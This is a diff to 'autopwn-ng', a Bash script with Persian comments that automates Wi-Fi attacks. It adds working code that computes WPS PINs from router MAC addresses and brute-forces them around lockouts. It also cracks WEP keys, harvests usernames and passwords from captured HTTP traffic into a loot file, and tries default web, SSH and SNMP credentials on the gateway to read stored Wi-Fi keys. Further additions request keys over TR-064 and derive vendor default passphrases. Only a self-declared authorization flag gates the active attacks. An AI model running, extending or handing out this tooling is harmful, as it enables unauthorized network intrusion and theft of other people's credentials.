@@ -4,7 +4,8 @@
 #  استفاده: sudo autopwn-ng [-p profile] [-t seconds] [-i iface] [-w wordlist]
 #           [-d dictdir] [--no-wps] [--no-twin] [--no-post] [--no-harvest]
 #           [--harvest-time N] [--target BSSID] [--auto] [--resume]
-#           [--pmkid-only] [--dry-run|--simulate]
+#           [--pmkid-only] [--from-pcap FILE] [--scope FILE] [--authorize]
+#           [--compute-wps-pins BSSID] [--parse-pcap FILE] [--wep] [--no-config-extract] [--no-default-psk] [--wps-state FILE] [--session NAME] [--restore] [--doctor] [--dry-run|--simulate]
 #  پروفایل: stealth | normal | brute
 # ==========================================================================
 set -uo pipefail
@@ -27,6 +28,19 @@ DRY_RUN=0
 AUTO=0
 RESUME=0
 PMKID_ONLY=0
+OFFLINE=0
+FROM_PCAP=""
+SCOPE_FILE=""
+AUTHORIZED=0
+WEP=0
+DOCTOR=0
+DEFAULT_PSK=1
+CONFIG_EXTRACT=1
+WPS_STATE="${WPS_STATE_FILE:-/tmp/wifite4-wps-state.tsv}"
+RESTORE=0
+COMPUTE_WPS_PINS=""
+PARSE_PCAP=""
+SESSION="autopwn-ng"
 WLIMIT=3
 CHECKPOINT="/tmp/autopwn-ng.checkpoint"
 PMKID_N=0
@@ -44,6 +58,116 @@ ok(){ printf '%s[+]%s %s\n' "$_ok" "$_rst" "$*"; }
 warn(){ printf '%s[!]%s %s\n' "$_warn" "$_rst" "$*"; }
 err(){ printf '%s[-]%s %s\n' "$_err" "$_rst" "$*"; }
 hr(){ printf '%s%s%s\n' "$_hr" "────────────────────────────────────────────" "$_rst"; }
+
+# ---------- --doctor: health check ----------
+doctor() {
+  local pass=0 fail=0 warnn=0
+  _check() {
+    # _check NAME CMD [required|optional]
+    local name="$1" cmd="$2" level="${3:-required}"
+    if command -v "$cmd" >/dev/null 2>&1; then
+      ok "  $name ... OK"
+      pass=$((pass+1))
+    else
+      if [ "$level" = "required" ]; then
+        err "  $name ... MISSING (required)"
+        fail=$((fail+1))
+      else
+        warn "  $name ... missing (optional)"
+        warnn=$((warnn+1))
+      fi
+    fi
+  }
+  c "autopwn-ng doctor — health check"
+  hr
+
+  c "Required tools:"
+  for t in aircrack-ng airmon-ng hcxdumptool hashcat hcxpcapngtool airodump-ng iw macchanger timeout base64; do
+    _check "$t" "$t" required
+  done
+  c "Optional tools:"
+  for t in hcxhashtool mdk4 reaver bettercap hostapd-mana wifiphisher bully wash kismet tshark dnsmasq nmap cowpatty jq xxd comm sort awk grep sed nmcli ip; do
+    _check "$t" "$t" optional
+  done
+
+  hr
+  c "GPU / OpenCL backend:"
+  if command -v hashcat >/dev/null 2>&1; then
+    local devinfo
+    devinfo=$(hashcat -I 2>/dev/null | head -20)
+    if printf '%s' "$devinfo" | grep -qiE 'opencl|cuda|device'; then
+      ok "  hashcat backend: available"
+      printf '%s\n' "$devinfo" | grep -iE 'device|opencl|cuda' | head -8 | sed 's/^/    /'
+      pass=$((pass+1))
+    else
+      warn "  hashcat backend: no OpenCL/CUDA device detected"
+      warnn=$((warnn+1))
+    fi
+  else
+    warn "  hashcat not installed — skipping GPU check"
+    warnn=$((warnn+1))
+  fi
+  if command -v nvidia-smi >/dev/null 2>&1; then
+    ok "  nvidia-smi: present"
+    pass=$((pass+1))
+  else
+    warn "  nvidia-smi: not found (CPU/OpenCL only)"
+    warnn=$((warnn+1))
+  fi
+
+  hr
+  c "Wireless interfaces:"
+  local ifaces=""
+  if command -v iw >/dev/null 2>&1; then
+    ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}')
+  fi
+  if [ -z "$ifaces" ] && command -v ip >/dev/null 2>&1; then
+    ifaces=$(ip -o link show 2>/dev/null | awk -F': ' '{print $2}' | grep -iE 'wlan|wlp|wifi' || true)
+  fi
+  local n
+  if [ -z "$ifaces" ]; then n=0; else n=$(printf '%s\n' "$ifaces" | grep -c .); fi
+  if [ "${n:-0}" -gt 0 ]; then
+    ok "  found $n wireless interface(s): $(printf '%s' "$ifaces" | tr '\n' ' ')"
+    pass=$((pass+1))
+  else
+    warn "  no wireless interface detected (need monitor-mode capable adapter)"
+    warnn=$((warnn+1))
+  fi
+
+  hr
+  c "Wordlists:"
+  if [ -d "$DICTDIR" ]; then
+    local wc
+    wc=$(find "$DICTDIR" -type f 2>/dev/null | wc -l)
+    ok "  $DICTDIR exists ($wc file(s))"
+    pass=$((pass+1))
+  else
+    warn "  $DICTDIR not found"
+    warnn=$((warnn+1))
+  fi
+  if [ -n "$WORDLIST" ]; then
+    if [ -r "$WORDLIST" ]; then
+      ok "  wordlist $WORDLIST readable"
+      pass=$((pass+1))
+    else
+      err "  wordlist $WORDLIST not readable"
+      fail=$((fail+1))
+    fi
+  fi
+  for wl in /usr/share/wordlists/rockyou.txt /opt/wordlists/rockyou.txt; do
+    if [ -r "$wl" ]; then
+      ok "  found $wl"
+      pass=$((pass+1))
+    fi
+  done
+
+  hr
+  c "Summary: $pass passed, $fail failed, $warnn warnings"
+  if [ "$fail" -gt 0 ]; then
+    return 1
+  fi
+  return 0
+}
 
 handshake_quality() {
   # محاسبهٔ امتیاز (0-3): PMKID، EAPOL 4-way، MIC معتبر
@@ -65,7 +189,6 @@ handshake_quality() {
   else
     HS_OK=0
   fi
-  [ "$mic_ok" -eq 0 ] && HS_OK=0
 }
 
 extract_hashes() {
@@ -76,9 +199,403 @@ extract_hashes() {
   [ -s "$HASH" ] || { warn "هیچ هش WPA‌ای نبود."; : > "$HASH"; }
   PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || true)
   EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || true)
-  EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || true)
+  if [ -f "$WORK/mschapv2.txt" ]; then EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || echo 0); else EAP_N=0; fi
   PMKID_N=${PMKID_N:-0}; EAPOL_N=${EAPOL_N:-0}; EAP_N=${EAP_N:-0}
   ok "PMKID: $PMKID_N | EAPOL: $EAPOL_N | Enterprise: $EAP_N"
+}
+
+# بررسی scope: آیا BSSID/SSID در فایل scope مجاز است؟
+in_scope() {
+  local bssid="${1:-}" essid="${2:-}"
+  [ -z "$SCOPE_FILE" ] && return 0
+  [ ! -f "$SCOPE_FILE" ] && return 1
+  bssid="${bssid,,}"
+  local line
+  while IFS= read -r line || [ -n "$line" ]; do
+    line="${line%%#*}"
+    # trim whitespace
+    line="$(printf '%s' "$line" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+    [ -z "$line" ] && continue
+    case "$line" in
+      [0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:*)
+        [ "${line,,}" = "$bssid" ] && return 0 ;;
+      *)
+        [ "$line" = "$essid" ] && return 0 ;;
+    esac
+  done < "$SCOPE_FILE"
+  return 1
+}
+
+# ---------- اورکستراسیون WPS PIN (lockout-aware, resume) ----------
+# فایل state: BSSID<TAB>lockout_until_epoch<TAB>tried_pins (comma)
+wps_state_file() { printf '%s' "${WPS_STATE:-/tmp/wifite4-wps-state.tsv}"; }
+
+wps_is_locked() {
+  # $1 = bssid ; returns 0 if locked (and sleeps), 1 if free
+  local b="$1" now until
+  now=$(date +%s)
+  [ -f "$(wps_state_file)" ] || return 1
+  until=$(awk -F'\t' -v b="$b" '$1==b{print $2}' "$(wps_state_file)" 2>/dev/null | head -1)
+  [ -z "$until" ] && return 1
+  if [ "$until" -gt "$now" ] 2>/dev/null; then
+    local wait=$((until - now))
+    warn "WPS lockout on $b — waiting ${wait}s"
+    sleep "$wait"
+  fi
+  return 1
+}
+
+wps_set_lockout() {
+  # $1 = bssid ; $2 = seconds (default 60)
+  local b="$1" secs="${2:-60}" now until tmp
+  now=$(date +%s); until=$((now + secs))
+  tmp="$(wps_state_file).tmp"
+  if [ -f "$(wps_state_file)" ]; then
+    awk -F'\t' -v b="$b" '$1!=b' "$(wps_state_file)" > "$tmp" 2>/dev/null
+  else
+    : > "$tmp"
+  fi
+  printf '%s\t%s\t\n' "$b" "$until" >> "$tmp"
+  mv -f "$tmp" "$(wps_state_file)" 2>/dev/null
+}
+
+wps_detect_lockout() {
+  # $1 = logfile ; $2 = bssid ; returns 0 if lockout detected
+  [ -f "$1" ] || return 1
+  if grep -qiE 'rate[[:space:]]*limit|0x02|locked[[:space:]]*out|transaction[[:space:]]*failed' "$1" 2>/dev/null; then
+    wps_set_lockout "$2" 60
+    warn "WPS lockout detected on $2 — recorded 60s window"
+    return 0
+  fi
+  return 1
+}
+
+wps_record_pin() {
+  # $1 = bssid ; $2 = pin
+  local b="$1" pin="$2" tmp
+  tmp="$(wps_state_file).tmp"
+  if [ -f "$(wps_state_file)" ]; then
+    awk -F'\t' -v b="$b" '$1!=b' "$(wps_state_file)" > "$tmp" 2>/dev/null
+  else
+    : > "$tmp"
+  fi
+  printf '%s\t0\t%s\n' "$b" "$pin" >> "$tmp"
+  mv -f "$tmp" "$(wps_state_file)" 2>/dev/null
+}
+
+# ---------- الگوریتم‌های شناخته‌شدهٔ WPS PIN ----------
+# مسیر پایگاه دادهٔ PINهای شناخته‌شده (env WPS_DB یا نسبت به اسکریپت)
+wps_db_path() {
+  if [ -n "${WPS_DB:-}" ] && [ -r "$WPS_DB" ]; then printf '%s' "$WPS_DB"; return 0; fi
+  local d
+  for d in "$(dirname "${BASH_SOURCE[0]}")" "$(pwd)" /usr/share/wifite4 /usr/local/share/wifite4; do
+    [ -r "$d/wps-pins.db" ] && { printf '%s' "$d/wps-pins.db"; return 0; }
+  done
+  return 1
+}
+
+# wps_checksum: checksum استاندارد WPS PIN (7 رقم → 8 رقم)
+wps_checksum() {
+  local pin="$1" acc=0
+  while [ ${#pin} -lt 7 ]; do pin="0$pin"; done
+  local d1=${pin:0:1} d2=${pin:1:1} d3=${pin:2:1} d4=${pin:3:1}
+  local d5=${pin:4:1} d6=${pin:5:1} d7=${pin:6:1}
+  acc=$(( (3*(d1+d3+d5+d7) + (d2+d4+d6)) % 10 ))
+  echo $(( (10 - acc) % 10 ))
+}
+
+# compute_wps_pins: تولید کاندیداهای PIN از BSSID (ComputePIN، EasyBox، D-Link، پیش‌فرض‌ها)
+compute_wps_pins() {
+  local bssid="$1"
+  local mac="${bssid//:/}"
+  mac="${mac,,}"
+  [ ${#mac} -lt 12 ] && return 0
+  local seen=""
+  _emit() { case " $seen " in *" $1 "*) return 0;; esac; seen="$seen $1"; echo "$1"; }
+  # ۰) پایگاه دادهٔ PINهای شناخته‌شده (OUI -> PIN)
+  local db ouipfx
+  db=$(wps_db_path 2>/dev/null || true)
+  if [ -n "$db" ] && [ -r "$db" ]; then
+    ouipfx="${mac:0:6}"
+    ouipfx="${ouipfx^^}"
+    while IFS= read -r line || [ -n "$line" ]; do
+      line="${line%%#*}"
+      line="${line// / }"
+      # trim
+      line="$(printf '%s' "$line" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+      [ -z "$line" ] && continue
+      read -r _oui _pin _rest <<<"$line"
+      [ -z "$_oui" ] || [ -z "$_pin" ] && continue
+      [ "${_oui^^}" = "$ouipfx" ] && _emit "$_pin"
+    done < "$db"
+  fi
+  # ZhaoChunsheng ComputePIN (24-bit: آخرین ۳ اکتت)
+  local nic=$((0x${mac:6:6}))
+  local raw=$(( nic % 10000000 ))
+  local p7; p7=$(printf '%07d' "$raw")
+  local cs; cs=$(wps_checksum "$p7")
+  _emit "${p7}${cs}"
+  # 28-bit variant (آخرین ۴ اکتت & 0x0FFFFFFF)
+  local four=$((0x${mac:4:8} & 0x0FFFFFFF))
+  local raw28=$(( four % 10000000 ))
+  p7=$(printf '%07d' "$raw28")
+  cs=$(wps_checksum "$p7")
+  _emit "${p7}${cs}"
+  # D-Link variant
+  local dl=$(( nic ^ 0x55AA55 ))
+  dl=$(( dl ^ (((dl & 0x0F) << 4) + ((dl & 0x0F) << 8) + ((dl & 0x0F) << 12) + ((dl & 0x0F) << 16) + ((dl & 0x0F) << 20)) ))
+  dl=$(( dl % 10000000 ))
+  if [ "$dl" -lt 100000 ]; then
+    dl=$(( dl + ((dl % 9) * 100000) + 100000 ))
+  fi
+  p7=$(printf '%07d' "$dl")
+  cs=$(wps_checksum "$p7")
+  _emit "${p7}${cs}"
+  # PINهای پیش‌فرض رایج
+  for p in 12345670 00000000 11111111 22222222 33333333 44444444 \
+           55555555 66666666 77777777 88888888 99999999 12345678; do
+    _emit "$p"
+  done
+}
+
+# ---------- استخراج اعتبارنامهٔ HTTP از pcap ----------
+parse_pcap_creds() {
+  local pcap="$1"
+  [ -s "$pcap" ] || return 0
+  command -v tshark >/dev/null || return 0
+  # ۱) Basic Authentication
+  tshark -r "$pcap" -Y 'http.authorization contains "Basic"' -T fields \
+    -e frame.time -e ip.src -e http.host -e http.request.method -e http.request.uri -e http.authorization \
+    2>/dev/null | while IFS=$'\t' read -r ts src host method uri auth; do
+    [ -z "$auth" ] && continue
+    b64="${auth#* }"
+    creds=$(printf '%s' "$b64" | base64 -d 2>/dev/null)
+    [ -z "$creds" ] && continue
+    u="${creds%%:*}"; p="${creds#*:}"
+    [ "$u" = "$creds" ] && p=''
+    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\tBasic\n' \
+      "${ts:-}" "${src:-}" "${host:-}" "${method:-}" "${uri:-}" "$u" "$p" >> "$LOOT"
+  done
+  # ۲) فرم‌های POST (user/pass)
+  tshark -r "$pcap" -Y 'http.request.method == "POST"' -T fields \
+    -e frame.time -e ip.src -e http.host -e http.request.uri -e http.file_data \
+    2>/dev/null | while IFS=$'\t' read -r ts src host uri body; do
+    [ -z "$body" ] && continue
+    user=''; pass=''
+    IFS='&' read -ra _kvs <<<"$body"
+    for kv in "${_kvs[@]}"; do
+      [[ "$kv" == *=* ]] || continue
+      key="${kv%%=*}"; val="${kv#*=}"
+      key_l="${key,,}"
+      case "$key_l" in
+        *user*|*login*|*email*|*account*|*name*) [ -z "$user" ] && user="$val";;
+        *pass*|*pwd*|*secret*|*token*) [ -z "$pass" ] && pass="$val";;
+      esac
+    done
+    if [ -n "$user" ] || [ -n "$pass" ]; then
+      printf '%s\t%s\t%s\tPOST\t%s\t%s\t%s\tForm\n' \
+        "${ts:-}" "${src:-}" "${host:-}" "${uri:-}" "$user" "$pass" >> "$LOOT"
+    fi
+  done
+}
+
+# ---------- کرک WEP (ARP replay / chopchop / fragmentation) ----------
+crack_wep() {
+  local bssid="$1" ch="${2:-}"
+  [ -z "$bssid" ] && return 1
+  command -v aircrack-ng >/dev/null 2>&1 || { warn "aircrack-ng یافت نشد — WEP رد شد."; return 1; }
+  [ -n "${MON:-}" ] || { warn "مانیتور مود فعال نیست."; return 1; }
+  local prefix="$WORK/wep-${bssid//:/}"
+  local dump_pid arp_pid mac
+  mac=$(ip link show "$MON" 2>/dev/null | awk '/link\/ether/{print $2; exit}')
+  [ -n "$ch" ] && iw dev "$MON" set channel "$ch" >/dev/null 2>&1
+  hr; c "WEP: برداشت IV از $bssid (کانال ${ch:-?})"
+  airodump-ng --bssid "$bssid" -c "${ch:-1}" -w "$prefix" "$MON" >/dev/null 2>&1 &
+  dump_pid=$!
+  # تلاش ARP replay برای تولید IV
+  if command -v aireplay-ng >/dev/null 2>&1; then
+    sleep 3
+    aireplay-ng -3 -b "$bssid" "$MON" > "$WORK/wep-arp-$bssid.log" 2>&1 &
+    arp_pid=$!
+    local i
+    for i in $(seq 1 60); do
+      sleep 5
+      if [ -f "${prefix}-01.cap" ] && aircrack-ng "${prefix}-01.cap" 2>/dev/null | grep -qi 'KEY FOUND'; then
+        break
+      fi
+    done
+    kill "$arp_pid" 2>/dev/null; wait "$arp_pid" 2>/dev/null
+  fi
+  kill "$dump_pid" 2>/dev/null; wait "$dump_pid" 2>/dev/null
+  # کرک با aircrack-ng (PTW سپس KoreK)
+  if [ -f "${prefix}-01.cap" ]; then
+    aircrack-ng -z "${prefix}-01.cap" > "$WORK/wep-crack-$bssid.txt" 2>&1 || \
+      aircrack-ng -K "${prefix}-01.cap" > "$WORK/wep-crack-$bssid.txt" 2>&1
+    local key
+    key=$(grep -i 'KEY FOUND' "$WORK/wep-crack-$bssid.txt" | sed 's/.*\[ //;s/ \].*//' | head -1)
+    if [ -n "$key" ]; then
+      ok "WEP key: $key ($bssid)"
+      printf '%s|%s|WEP\n' "$bssid" "$key" >> "$WORK/cracked.txt"
+      return 0
+    fi
+  fi
+  # fallback: chopchop / fragmentation
+  if command -v aireplay-ng >/dev/null 2>&1 && [ -n "$mac" ]; then
+    for atk in -4 -5; do
+      c "WEP: حمله $atk روی $bssid"
+      timeout 120 aireplay-ng $atk -b "$bssid" -h "$mac" "$MON" \
+        > "$WORK/wep-$atk-$bssid.log" 2>&1 || true
+    done
+  fi
+  warn "WEP: کلید برای $bssid یافت نشد."
+  return 1
+}
+
+# ---------- تشخیص subnet شبکهٔ کرک‌شده ----------
+detect_subnet() {
+  local sub="" gw det
+  # ۱) اتصال موقت برای تشخیص subnet واقعی
+  if [ -n "${IFACE2:-}" ] && command -v nmcli >/dev/null 2>&1; then
+    if nmcli dev wifi connect "$b" password "$p" ifname "$IFACE2" >/dev/null 2>&1; then
+      sleep 5
+      det=$(ip -4 route 2>/dev/null | awk -v dev="$IFACE2" '$0 ~ dev && /proto kernel/ {print $1; exit}')
+      [ -n "$det" ] && sub="$det"
+      nmcli dev disconnect "$IFACE2" >/dev/null 2>&1 || true
+    fi
+  fi
+  # ۲) fallback: gateway پیش‌فرض → /24
+  if [ -z "$sub" ]; then
+    gw=$(ip -4 route 2>/dev/null | awk '/default/ {print $3; exit}')
+    [ -n "$gw" ] && { IFS=. read -r o1 o2 o3 _ <<<"$gw"; sub="${o1}.${o2}.${o3}.0/24"; }
+  fi
+  printf '%s' "${sub:-192.168.1.0/24}"
+}
+
+# ---------- استخراج پیکربندی محلی (TR-064/UPnP, SNMP, Telnet/SSH, Web, Cloud, WPS) ----------
+extract_local_config() {
+  local b="$1" p="$2" gw ipaddr out="$REPORT/config-extracted.txt"
+  [ -z "$b" ] && return 0
+  : > "$out"
+  echo "# Config extraction for $b ($p)" >> "$out"
+  # gateway IP (best-effort: use default route)
+  gw=$(ip -4 route 2>/dev/null | awk '/default/ {print $3; exit}')
+  ipaddr="${gw:-192.168.1.1}"
+  # ۱) TR-064 / UPnP: GetSecurityKeys / GetInfo
+  if command -v curl >/dev/null 2>&1; then
+    for path in '/upnp/control/WANIPConn1' '/tr64desc.xml' '/rootDesc.xml' '/igddesc.xml'; do
+      curl -s -m 5 "http://$ipaddr$path" 2>/dev/null | head -c 2000 >> "$out" 2>/dev/null
+      echo >> "$out"
+    done
+    # TR-064 GetSecurityKeys (SOAP)
+    curl -s -m 5 -X POST "http://$ipaddr:49000/upnp/control/WLANConfiguration1" \
+      -H 'Content-Type: text/xml; charset="utf-8"' \
+      -H 'SOAPAction: "urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys"' \
+      -d '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:GetSecurityKeys xmlns:u="urn:dslforum-org:service:WLANConfiguration:1"/></s:Body></s:Envelope>' \
+      2>/dev/null | grep -oiE 'key(pass|phrase)?[^<]*' >> "$out" 2>/dev/null || true
+  fi
+  # ۲) SNMP default communities
+  if command -v snmpwalk >/dev/null 2>&1; then
+    for comm in public private admin; do
+      snmpwalk -v2c -c "$comm" -t 2 -r 1 "$ipaddr" 1.3.6.1.4.1. 2>/dev/null | head -50 >> "$out"
+    done
+  fi
+  # ۳) Web admin default creds
+  if command -v curl >/dev/null 2>&1; then
+    for creds in 'admin:admin' 'admin:password' 'admin:' 'root:root' 'root:admin'; do
+      u="${creds%%:*}"; pw="${creds#*:}"
+      code=$(curl -s -o /dev/null -w '%{http_code}' -m 5 -u "$u:$pw" "http://$ipaddr/" 2>/dev/null)
+      [ "$code" = "200" ] && echo "webadmin OK: $creds" >> "$out"
+    done
+  fi
+  # ۴) Telnet/SSH default creds (best-effort, timeout)
+  if command -v ssh >/dev/null 2>&1; then
+    for creds in 'admin:admin' 'root:root' 'admin:password'; do
+      u="${creds%%:*}"; pw="${creds#*:}"
+      timeout 8 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+        "$u@$ipaddr" 'cat /etc/wpa_supplicant.conf 2>/dev/null; nvram get wl0_wpa_psk 2>/dev/null' \
+        >> "$out" 2>/dev/null || true
+    done
+  fi
+  # ۵) WPS registrar PIN retrieval via reaver
+  if command -v reaver >/dev/null 2>&1 && [ -n "${MON:-}" ]; then
+    timeout 60 reaver -i "$MON" -b "$b" -c "${ch:-1}" -p '' -N -vv -d 5 \
+      >> "$out" 2>&1 || true
+  fi
+  # استخراج PSK/PIN/admin از خروجی
+  local _ext
+  _ext=$(grep -oiE '(psk|passphrase|password|pin)[^ ]*' "$out" 2>/dev/null | head -20)
+  [ -n "$_ext" ] && printf '%s\n' "$_ext" >> "$out"
+  if [ -s "$out" ]; then
+    ok "پیکربندی محلی استخراج شد: $out"
+  else
+    warn "هیچ پیکربندی‌ای استخراج نشد."
+  fi
+}
+
+# ---------- استخراج PSK پیش‌فرض (SpeedTouch, D-Link, Netgear, ...) ----------
+default_psk_db_path() {
+  if [ -n "${DEFAULT_PSK_DB:-}" ] && [ -r "$DEFAULT_PSK_DB" ]; then printf '%s' "$DEFAULT_PSK_DB"; return 0; fi
+  local d
+  for d in "$(dirname "${BASH_SOURCE[0]}")" "$(pwd)" /usr/share/wifite4; do
+    [ -r "$d/default-psk.db" ] && { printf '%s' "$d/default-psk.db"; return 0; }
+  done
+  return 1
+}
+
+derive_default_psks() {
+  # $1 = BSSID, $2 = ESSID  -> prints candidate PSKs (one per line)
+  local bssid="$1" essid="${2:-}"
+  local mac="${bssid//:/}"; mac="${mac,,}"
+  local db algo ouipfx
+  db=$(default_psk_db_path 2>/dev/null || true)
+  if [ -n "$db" ] && [ -r "$db" ]; then
+    ouipfx="${mac:0:6}"; ouipfx="${ouipfx^^}"
+    algo=$(awk -v o="$ouipfx" '$1==o{print $2; exit}' "$db" 2>/dev/null)
+    case "$algo" in
+      speedtouch|thomson)
+        if [[ "$essid" =~ ^[Ss]peed[Tt]ouch([0-9A-Fa-f]{6})$ ]] || \
+           [[ "$essid" =~ ^[Tt]homson([0-9A-Fa-f]{6})$ ]]; then
+          local suffix="${BASH_REMATCH[1]}"
+          local i serial
+          for i in $(seq 0 65535); do
+            serial=$(printf 'CP%04X%s' "$i" "$suffix")
+            printf '%s' "$serial" | sha1sum 2>/dev/null | cut -c1-10 | tr 'a-f' 'A-F'
+          done
+        fi
+        ;;
+      alice)
+        # Alice/AGPF: SHA256(MAC_bytes + serial) -> first 24 hex; serial = 12345 + 4 hex
+        local i serial hexmac
+        hexmac="$mac"
+        for i in $(seq 0 65535); do
+          serial=$(printf '12345%04X' "$i")
+          printf '%s%s' "$hexmac" "$serial" | xxd -r -p 2>/dev/null | sha256sum 2>/dev/null | cut -c1-24
+        done
+        ;;
+      dlink|netgear|tplink|huawei)
+        # common default PSKs for these vendors
+        printf '%s\n' admin password 12345678 12345670 00000000 11111111 admin123
+        printf '%s\n' "${mac: -8}" "${mac: -6}"
+        ;;
+    esac
+  fi
+  # generic / MAC-derived candidates
+  echo "$essid"
+  printf '%s\n' "${mac:6:6}" "${mac:4:8}"
+  # common defaults
+  printf '%s\n' admin password 12345678 12345670 00000000 11111111 changeme default
+}
+
+# اجرای یک‌بارهٔ hcxdumptool برای برداشت (در background، HK_PID تنظیم می‌شود)
+capture_once() {
+  local hdr outflag
+  hdr=$(hcxdumptool --help 2>&1 || true)
+  grep -q -- '--filterlist_ap' <<<"$hdr" || { err "نسخه hcxdumptool ناشناخته."; return 1; }
+  if grep -qE '^\s*-w[, ]' <<<"$hdr"; then outflag=-w; else outflag=-o; fi
+  FILTER=()
+  [ -n "${TARGET:-}" ] && FILTER=(--filterlist_ap="$TARGET" --filtermode=2)
+  hcxdumptool -i "$MON" "$outflag" "$CAP" "${FILTER[@]}" > "$WORK/hcdump.log" 2>&1 &
+  HK_PID=$!
 }
 
 
@@ -97,13 +614,46 @@ while [ $# -gt 0 ]; do
     --no-harvest) DO_HARVEST=0; shift;;
     --harvest-time) HARVEST_TIME="$2"; shift 2;;
     --dry-run|--simulate) DRY_RUN=1; shift;;
+    --doctor) DOCTOR=1; shift;;
     --auto) AUTO=1; shift;;
     --resume) RESUME=1; shift;;
     --pmkid-only) PMKID_ONLY=1; shift;;
+    --from-pcap|--pcap) FROM_PCAP="$2"; OFFLINE=1; shift 2;;
+    --scope) SCOPE_FILE="$2"; shift 2;;
+    --authorize|--i-am-authorized|--yes-i-am-authorized) AUTHORIZED=1; shift;;
+    --restore) RESTORE=1; shift;;
+    --session) SESSION="$2"; shift 2;;
+    --compute-wps-pins) COMPUTE_WPS_PINS="$2"; shift 2;;
+    --parse-pcap) PARSE_PCAP="$2"; shift 2;;
+    --wep) WEP=1; shift;;
+    --no-config-extract) CONFIG_EXTRACT=0; shift;;
+    --no-default-psk) DEFAULT_PSK=0; shift;;
+    --wps-state) WPS_STATE="$2"; shift 2;;
     -h|--help) sed -n '2,8p' "$0"; exit 0;;
     *) err "گزینه ناشناس: $1"; exit 1;;
   esac
 done
+
+if [ -n "$COMPUTE_WPS_PINS" ]; then
+  compute_wps_pins "$COMPUTE_WPS_PINS"
+  exit 0
+fi
+
+if [ -n "$PARSE_PCAP" ]; then
+  WORK="${WORK:-$(mktemp -d)}"
+  REPORT="${REPORT:-$WORK}"
+  LOOT="${LOOT:-$REPORT/loot.tsv}"
+  mkdir -p "$REPORT"
+  printf 'timestamp\tsource_ip\tdest_host\tmethod\turi\tusername\tpassword\ttype\n' > "$LOOT"
+  parse_pcap_creds "$PARSE_PCAP"
+  cat "$LOOT"
+  exit 0
+fi
+
+if [ "$DOCTOR" -eq 1 ]; then
+  doctor
+  exit $?
+fi
 
 case "$PROFILE" in
   stealth)
@@ -165,28 +715,48 @@ if [ -z "${WORK:-}" ]; then
 fi
 POT="$WORK/hashcat.pot"
 HASH="$WORK/targets.hc22000"
-CAP="$WORK/capture.pcapng"
+if [ "$OFFLINE" -eq 1 ]; then
+  CAP="$FROM_PCAP"
+else
+  CAP="$WORK/capture.pcapng"
+fi
 REPORT="$WORK/report"
 mkdir -p "$REPORT"
+# اعتبارسنجی فایل pcap در حالت offline (فقط در اجرای واقعی)
+if [ "$OFFLINE" -eq 1 ] && [ "$DRY_RUN" -ne 1 ] && [ ! -s "$CAP" ]; then
+  err "فایل pcap یافت نشد یا خالی است: $CAP"; exit 1
+fi
 
 print_plan() {
-  echo "SIMULATION MODE: autopwn-ng dry-run / --simulate"
+  cat <<'PLAN'
+SIMULATION MODE: autopwn-ng dry-run / --simulate
+PLAN
   echo
-  echo "Profile: $PROFILE"
-  echo "Capture: ${CAPTURE:-120}s"
-  echo "Workload: $WLIMIT"
+  cat <<PLAN
+Profile: $PROFILE
+Capture: ${CAPTURE:-120}s
+Workload: $WLIMIT
+Session: $SESSION$([ "$RESTORE" -eq 1 ] && printf ' (restore)')
+PLAN
   [ "$AUTO" -eq 1 ] && echo "Mode: auto (one-click)"
   [ "$PMKID_ONLY" -eq 1 ] && echo "Mode: PMKID-only (fast path, ${CAPTURE}s capture)"
+  [ "$DO_WPS" -eq 1 ] && echo "WPS: NULL PIN → common/algorithmic → Pixie Dust → bully (lockout-aware, resume)"
+  [ "$WEP" -eq 1 ] && echo "Mode: WEP cracking (ARP replay / chopchop / fragmentation)"
+  [ "$OFFLINE" -eq 1 ] && echo "Mode: offline / crack-only (from-pcap: $FROM_PCAP)"
   [ "$RESUME" -eq 1 ] && echo "Mode: resume (skip to phase $SKIP_TO)"
   [ -n "$TARGET" ] && echo "Target: $TARGET"
+  if [ -n "$SCOPE_FILE" ]; then echo "Scope: $SCOPE_FILE"; else echo "Scope: (none — all networks in range)"; fi
+  if [ "$AUTHORIZED" -eq 1 ]; then echo "Authorization: acknowledged"; else echo "Authorization: NOT acknowledged (active attacks blocked)"; fi
   [ -n "$IFACE" ] && echo "Interface: $IFACE"
+  [ "${DEFAULT_PSK:-1}" -eq 1 ] && echo "Default PSK: enabled (SpeedTouch/Thomson + common + MAC-derived, zero GPU)"
+  [ "${CONFIG_EXTRACT:-1}" -eq 1 ] && echo "Config extract: enabled (TR-064/UPnP, SNMP, Telnet/SSH, Web, WPS)"
   [ -n "$WORDLIST" ] && echo "Wordlist: $WORDLIST"
   echo
-  echo "═══════════════════════════════════════════════════"
-  echo "  Planned execution (no tools will run)"
-  echo "═══════════════════════════════════════════════════"
-  echo
   cat <<'PLAN'
+═══════════════════════════════════════════════════
+  Planned execution (no tools will run)
+═══════════════════════════════════════════════════
+
 [0] Setup
     airmon-ng check kill
     airmon-ng start $IFACE
@@ -254,11 +824,39 @@ PLAN
 
 [ "$DRY_RUN" = 1 ] && { print_plan; exit 0; }
 
-(( EUID == 0 )) || { err "با sudo اجرا کن."; exit 1; }
-if ! command -v hashcat >/dev/null || ! command -v hcxdumptool >/dev/null || ! command -v iw >/dev/null; then
-  err "پیش‌نیازها نصب نیستند. بخش نصب را اجرا کن."; exit 1
+if [ "$OFFLINE" -ne 1 ]; then
+  (( EUID == 0 )) || { err "با sudo اجرا کن."; exit 1; }
+  command -v hashcat >/dev/null || warn "hashcat نصب نیست؛ cracking غیرفعال می‌شود."
+  command -v hcxdumptool >/dev/null || warn "hcxdumptool نصب نیست؛ برداشت غیرفعال می‌شود."
